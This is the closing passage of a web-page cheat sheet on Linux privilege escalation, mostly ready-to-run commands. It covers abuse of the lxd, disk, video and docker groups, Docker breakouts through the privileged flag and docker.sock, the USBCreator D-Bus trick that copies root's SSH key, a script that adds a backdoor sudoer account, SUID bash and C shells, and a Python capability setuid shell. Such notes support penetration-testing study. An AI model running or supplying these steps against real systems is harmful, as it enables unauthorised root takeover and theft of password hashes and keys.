<p>A member of the local “lxd” group can instantly escalate the privileges to root on the host operating system. This is irrespective of whether that user has been granted sudo rights and does not require them to enter their password. The vulnerability exists even with the LXD snap package.</p>

<h3 id="with-internet">With Internet</h3>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lxc init ubuntu:16:04 myimage <span class="nt">-c</span> security.privileged<span class="o">=</span><span class="nb">true
</span>lxc config device add myimage whatever disk <span class="nb">source</span><span class="o">=</span>/ <span class="nv">path</span><span class="o">=</span>/mnt/root <span class="nv">recursive</span><span class="o">=</span><span class="nb">true
</span>lxc start <span class="nb">test
</span>lxc <span class="nb">exec test </span>bash
</code></pre></div></div>

<h3 id="without-internet">Without Internet</h3>

<p>Build an Alpine image and start it using the flag <code class="highlighter-rouge">security.privileged=true</code>, forcing the container to interact as root with the host filesystem.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># build a simple alpine image</span>
git clone https://github.com/saghul/lxd-alpine-builder
<span class="nb">cd </span>lxd-alpine-builder
<span class="nb">sed</span> <span class="nt">-i</span> <span class="s1">'s,yaml_path="latest-stable/releases/$apk_arch/latest-releases.yaml",yaml_path="v3.8/releases/$apk_arch/latest-releases.yaml",'</span> build-alpine
<span class="nb">sudo</span> ./build-alpine <span class="nt">-a</span> i686
</code></pre></div></div>

<p>Also you can download directly the image from ubuntu:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget http://cloud-images.ubuntu.com/xenial/current/xenial-server-cloudimg-amd64-root.tar.xz
wget http://cloud-images.ubuntu.com/xenial/current/xenial-server-cloudimg-amd64-lxd.tar.xz
And exploit it:
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># import the image</span>
lxc image import ./alpine<span class="k">*</span>.tar.gz <span class="nt">--alias</span> myimage <span class="c"># It's important doing this from YOUR HOME directory on the victim machine, or it might fail.</span>
lxc image import xenial-server-cloudimg-amd64-<span class="k">*</span>.tar.xz <span class="nt">--alias</span> myimage <span class="c"># Or this depending if you downloaded</span>

<span class="c"># before running the image, start and configure the lxd storage pool as default </span>
lxd init

<span class="c"># run the image</span>
lxc init myimage mycontainer <span class="nt">-c</span> security.privileged<span class="o">=</span><span class="nb">true</span>

<span class="c"># mount the /root into the image</span>
lxc config device add mycontainer mydevice disk <span class="nb">source</span><span class="o">=</span>/ <span class="nv">path</span><span class="o">=</span>/mnt/root <span class="nv">recursive</span><span class="o">=</span><span class="nb">true</span>

<span class="c"># interact with the container</span>
lxc start mycontainer
lxc <span class="nb">exec </span>mycontainer /bin/sh
</code></pre></div></div>

<h2 id="adm">adm</h2>

<p>All members of the group <code class="highlighter-rouge">admin</code> have access to logs files:</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/var/log/
</code></pre></div></div>

<h2 id="disk">disk</h2>

<p>All members of the gorup <code class="highlighter-rouge">disk</code> have full access to the filesystem.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">df</span> <span class="nt">-h</span> <span class="c">#search disk</span>

debugfs /dev/sda1
debugfs: <span class="nb">cd</span> /root
debugfs: <span class="nb">cat</span> /root/.ssh/id_rsa
debugfs: <span class="nb">cat</span> /etc/shadow
</code></pre></div></div>

<p>We can also write files on the filesystem.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>debugfs <span class="nt">-w</span> /dev/sda1
debugfs: dump file1.txt file2.txt  <span class="c">#Copy file1.txt to file2.txt</span>
</code></pre></div></div>

<blockquote>
  <p><strong>Hint</strong>: Files owned by root are now writable such as <code class="highlighter-rouge">/etc/passwd</code> or <code class="highlighter-rouge">/etc/shadow</code>.</p>
</blockquote>

<h2 id="video">video</h2>

<p>The video group has access to view the screen output of all opened sessions (tty). With <code class="highlighter-rouge">w</code> command we can see the who is logged on the server:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>moshe@falafel:/var/log<span class="nv">$ </span>w
 17:35:42 up  3:40,  3 <span class="nb">users</span>,  load average: 0.22, 0.09, 0.08
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      13:55    3:40m  0.05s  0.04s <span class="nt">-bash</span>
moshe    pts/0    10.10.14.20      17:18    0.00s  0.08s  0.00s w
moshe    pts/1    10.10.14.20      17:18   15:17   0.03s  0.03s bash
</code></pre></div></div>

<p>So we need to grab the video output and graphics configuration.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>moshe@falafel:/var/log<span class="nv">$ </span><span class="nb">cat</span> /dev/fb0 <span class="o">&gt;</span> /tmp/screen.raw
moshe@falafel:/var/log<span class="nv">$ </span><span class="nb">cat</span> /sys/class/graphics/fb0/virtual_size
1176,885
</code></pre></div></div>

<p>Finally we can open the data with GIMP.</p>

<p><img src="/hackingnotes/images/video.png" alt="" /></p>

<h2 id="docker">docker</h2>

<p>Since we are member of docker group, we can mount the root filesystem of the host machine to an instance’s volume.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>docker image <span class="nb">ls
</span>REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
ubuntu              latest              775349758637        22 months ago       64.2MB
alpine              latest              965ea09ff2eb        22 months ago       5.55MB
centos              latest              0f3e07c0138f        23 months ago       220MB

<span class="nv">$ </span>docker run <span class="nt">-it</span> <span class="nt">--rm</span> <span class="nt">-v</span> /:/mnt &lt;imagename&gt; <span class="nb">chroot</span> /mnt bash

<span class="c"># Edit /etc/passwd to get root access to the host</span>
</code></pre></div></div>

<p>We can also mount the filesystem and the network access.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ docker run --rm -it --pid=host --net=host --privileged -v /:/mnt &lt;imagename&gt; chroot /mnt bashbash
</code></pre></div></div>

<h1 id="docker-breakout">Docker Breakout</h1>

<h2 id="privileged-flag-enabled">Privileged Flag enabled</h2>

<p>When we start a docker with the privileged flag <code class="highlighter-rouge">--privileged</code> , we give the sufficient permission to mount the host filesystem inside the docker.</p>

<p>When the <code class="highlighter-rouge">root</code> user is owned, we will search the host drive:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>fdisk <span class="nt">-l</span>
</code></pre></div></div>

<p>After finding the Linux sda we will mount it:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">mkdir</span> <span class="nt">-p</span> /mnt/host_drive
mount /dev/sda1 /mnt/host_drive
</code></pre></div></div>

<p>Finally, just <code class="highlighter-rouge">cd</code> to out new mount point to find all host files.</p>

<h2 id="dockersock-available">Docker.sock available</h2>

<p>By default, when the <code class="highlighter-rouge">docker</code> command is executed on a host, an API call to the docker daemon is made via a non-networked UNIX socket located at <code class="highlighter-rouge">/var/run/docker.sock</code>. However, many containers and guides require you to expose this socket file as a volume within a container or in some cases, expose it on a TCP port. Docker containers that expose <code class="highlighter-rouge">/var/run/docker.sock</code>, locally or remotely, could lead to a full environment take over.</p>

<h3 id="check-if-socket-is-available">Check if socket is available</h3>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">ls</span> <span class="nt">-alh</span> /var/run/docker.sock
</code></pre></div></div>

<h3 id="list-all-containers">List all containers</h3>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-ik</span> <span class="nt">--unix-socket</span> /var/run/docker.sock http://&lt;docker_host&gt;:PORT/containers/json
</code></pre></div></div>

<h3 id="create-an-exec">Create an exec</h3>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-ik</span> <span class="nt">-X</span> POST <span class="nt">--unix-socket</span> /var/run/docker.sock <span class="nt">-H</span> <span class="s2">"Content-Type: application/json"</span> <span class="nt">--data-binary</span> <span class="s1">'{"AttachStdin": true,"AttachStdout": true,"AttachStderr": true,"Cmd": ["cat", "/etc/passwd"],"DetachKeys": "ctrl-p,ctrl-q","Privileged": true,"Tty": true}'</span> http://&lt;docker_host&gt;:PORT/containers/&lt;container_id&gt;/exec
</code></pre></div></div>

<h3 id="start-the-exec">Start the exec</h3>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-ik</span> <span class="nt">-X</span> POST <span class="nt">--unix-socket</span> /var/run/docker.sock <span class="nt">-H</span> <span class="s2">"Content-Type: application/json"</span> <span class="nt">--data-binary</span> <span class="s1">'{"Detach": false,"Tty": true} http://&lt;docker_host&gt;:PORT/exec/&lt;exec_id&gt;/start'</span> 
</code></pre></div></div>

<ul>
  <li><a href="https://dejandayoff.com/the-danger-of-exposing-docker.sock/">https://dejandayoff.com/the-danger-of-exposing-docker.sock/</a></li>
</ul>

<h1 id="usbcreator-d-bus">USBCreator D-Bus</h1>

<p>A vulnerability in the USBCreator D-Bus interface allows an attacker with access to a user in the <strong>sudoer group to bypass the password</strong> security policy imposed by the sudo program. The vulnerability allows an attacker to overwrite arbitrary files with arbitrary content, as root – <strong>without supplying a password.</strong></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdbus call <span class="nt">--system</span> <span class="nt">--dest</span> com.ubuntu.USBCreator <span class="nt">--object-path</span> /com/ubuntu/USBCreator <span class="nt">--method</span> com.ubuntu.USBCreator.Image /root/.ssh/id_rsa /id_rsa <span class="nb">true</span>
</code></pre></div></div>

<ul>
  <li><a href="https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/">https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/</a></li>
</ul>

<h1 id="executing-files-with-root">Executing files with root</h1>

<h2 id="adding-a-new-sudoer-user-bash">Adding a new SUDOER user (Bash)</h2>

<p>We can create a new user and add it to the sudoers file:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>

useradd dirty_sock <span class="nt">-m</span> <span class="nt">-p</span> <span class="s1">'$6$sWZcW1t25pfUdBuX$jWjEZQF2zFSfyGy9LbvG3vFzzHRjXfBYK0SOGfMD1sLyaS97AwnJUs7gDCY.fg19Ns3JwRdDhOcEmDpBVlF9m.'</span> <span class="nt">-s</span> /bin/bash
usermod <span class="nt">-aG</span> <span class="nb">sudo </span>dirty_sock
<span class="nb">echo</span> <span class="s2">"dirty_sock    ALL=(ALL:ALL) ALL"</span> <span class="o">&gt;&gt;</span> /etc/sudoers
</code></pre></div></div>

<h2 id="creating-a-suid-shell-bash">Creating a SUID shell (bash)</h2>

<p>We can copy the bash file to temp and give it SUID permissions.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cp</span> /bin/bash /tmp/bash
<span class="nb">chmod </span>u+s /tmp/bash

/tmp/bash <span class="nt">-p</span>
</code></pre></div></div>

<h2 id="creating-a-suid-file-c">Creating a SUID file (c)</h2>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;unistd.h&gt;
</span><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
    <span class="n">setreuid</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
    <span class="n">execl</span><span class="p">(</span><span class="s">"/bin/bash"</span><span class="p">,</span> <span class="s">"bash"</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="nb">NULL</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<h2 id="creating-a-suid-shell-c">Creating a SUID shell (C)</h2>

<p>We can write the following C code in order to obtain a bash shell:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;
</span>
<span class="kt">int</span> <span class="nf">main</span> <span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="s">"/bin/bash"</span><span class="p">,</span> <span class="s">"-p"</span><span class="p">,</span> <span class="nb">NULL</span> <span class="p">};</span>
    <span class="n">execve</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">argv</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>We just need to compile and give SUID permissions from root in our attacking machine.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gcc <span class="nt">-m32</span> shell.c <span class="nt">-o</span> shell
root@kali <span class="nv">$ </span><span class="nb">chmod</span> +s shell
</code></pre></div></div>

<p>Finally we need to transfer the file with the command execution.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/tmp/shell <span class="nt">-p</span>
</code></pre></div></div>

<h1 id="capabilities">Capabilities</h1>

<p>Capabilities are those permissions that divide the privileges of kernel user or kernel level programs into small pieces so that a process can be allowed sufficient power to perform specific privileged tasks.</p>

<p>Search files with capabilities:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>getcap <span class="nt">-r</span> / 2&gt;/dev/null
</code></pre></div></div>

<h2 id="python-capability">Python Capability</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 <span class="nt">-c</span> <span class="s1">'import os; os.setuid(0); os.system("/bin/bash")'</span>
</code></pre></div></div>

<h1 id="references">References:</h1>

<ul>
  <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md</a></li>
  <li><a href="https://sushant747.gitbooks.io/total-oscp-guide/content/privilege\_escalation\_-\_linux.html">https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_-_linux.html</a></li>
  <li><a href="https://payatu.com/guide-linux-privilege-escalation">https://payatu.com/guide-linux-privilege-escalation</a></li>
  <li><a href="https://www.hackingarticles.in/lxd-privilege-escalation/">https://www.hackingarticles.in/lxd-privilege-escalation/</a></li>
  <li><a href="https://int0x33.medium.com/day-67-tar-cron-2-root-abusing-wildcards-for-tar-argument-injection-in-root-cronjob-nix-c65c59a77f5e">https://int0x33.medium.com/day-67-tar-cron-2-root-abusing-wildcards-for-tar-argument-injection-in-root-cronjob-nix-c65c59a77f5e</a></li>
  <li><a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation/escaping-from-limited-bash">https://book.hacktricks.xyz/linux-unix/privilege-escalation/</a></li>
  <li><a href="https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/">https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/</a></li>
  <li><a href="https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/">https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/</a></li>
</ul>

			</article>
		</section>

		<script>
			document.getElementById("open-nav").addEventListener("click", function () {
				document.body.classList.toggle("nav-open");
			});
		</script>
	</body>
</html>
